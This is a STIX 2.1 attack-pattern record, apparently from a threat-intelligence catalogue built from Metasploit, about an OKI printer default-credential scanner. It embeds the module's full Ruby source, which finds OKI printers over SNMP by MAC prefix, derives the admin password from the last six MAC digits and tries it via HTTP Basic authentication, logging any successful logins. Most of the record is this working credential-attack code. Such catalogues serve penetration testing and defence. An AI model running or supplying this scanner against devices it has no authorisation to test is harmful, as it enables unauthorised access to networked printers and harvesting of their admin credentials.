{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c8a0ca18-863e-49fe-ac67-4fbc70867417",
    "created": "2024-08-14T16:27:08.191031Z",
    "modified": "2024-08-14T16:27:08.191035Z",
    "name": "OKI Printer Default Login Credential Scanner",
    "description": " This module scans for OKI printers via SNMP, then tries to connect to found devices with vendor default administrator credentials via HTTP authentication. By default, OKI network printers use the last six digits of the MAC as admin password. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/oki_scanner.rb",
            "external_id": "oki_scanner.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# TODO: Split this module into two seperate SNMP and HTTP modules.\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'          => 'OKI Printer Default Login Credential Scanner',\n      'Description'   => %q{\n        This module scans for OKI printers via SNMP, then tries to connect to found devices\n        with vendor default administrator credentials via HTTP authentication. By default, OKI\n        network printers use the last six digits of the MAC as admin password.\n      },\n      'Author'        => 'antr6X <anthr6x[at]gmail.com>',\n      'License'       => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptPort.new('SNMPPORT', [true, 'The SNMP Port', 161]),\n        OptPort.new('HTTPPORT', [true, 'The HTTP Port', 80])\n      ])\n\n    deregister_options('RPORT', 'VHOST')\n  end\n\n  def cleanup\n    datastore['RPORT'] = @org_rport\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n    @org_rport = datastore['RPORT']\n    datastore['RPORT'] = datastore['SNMPPORT']\n\n    index_page = \"index_ad.htm\"\n    auth_req_page = \"status_toc_ad.htm\"\n    snmp = connect_snmp()\n\n    snmp.walk(\"1.3.6.1.2.1.2.2.1.6\") do |mac|\n      last_six  = mac.value.unpack(\"H2H2H2H2H2H2\").join[-6,6].upcase\n      first_six = mac.value.unpack(\"H2H2H2H2H2H2\").join[0,6].upcase\n\n      # check if it is a OKI\n      # OUI list can be found at http://standards.ieee.org/develop/regauth/oui/oui.txt\n      if first_six ==  \"002536\" || first_six == \"008087\" || first_six == \"002536\"\n        sys_name = snmp.get_value('1.3.6.1.2.1.1.5.0').to_s\n        print_status(\"Found: #{sys_name}\")\n        print_status(\"Trying credential: admin/#{last_six}\")\n\n        tcp = Rex::Socket::Tcp.create(\n          'PeerHost' => rhost,\n          'PeerPort' => datastore['HTTPPORT'],\n          'Context' =>\n            {\n              'Msf'=>framework,\n              'MsfExploit'=>self\n            }\n        )\n\n        auth = Rex::Text.encode_base64(\"admin:#{last_six}\")\n\n        http_data = \"GET /#{auth_req_page} HTTP/1.1\\r\\n\"\n        http_data << \"Referer: http://#{ip}/#{index_page}\\r\\n\"\n        http_data << \"Authorization: Basic #{auth}\\r\\n\\r\\n\"\n\n        tcp.put(http_data)\n        data = tcp.recv(12)\n\n        response = \"#{data[9..11]}\"\n\n        case response\n        when \"200\"\n          print_good(\"#{rhost}:#{datastore['HTTPPORT']} logged in as: admin/#{last_six}\")\n          report_cred(\n            ip: rhost,\n            port: datastore['HTTPPORT'],\n            service_name: 'http',\n            user: 'admin',\n            password: last_six,\n            proof: response.inspect\n          )\n        when \"401\"\n          print_error(\"Default credentials failed\")\n        when \"404\"\n          print_status(\"Page not found, try credential manually: admin/#{last_six}\")\n        else\n          print_status(\"Unexpected message\")\n        end\n\n        disconnect()\n      end\n    end\n\n    # No need to make noise about timeouts\n    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"#{ip} Error: #{e.class} #{e} #{e.backtrace}\")\n    ensure\n      disconnect_snmp\n    end\nend\n"
}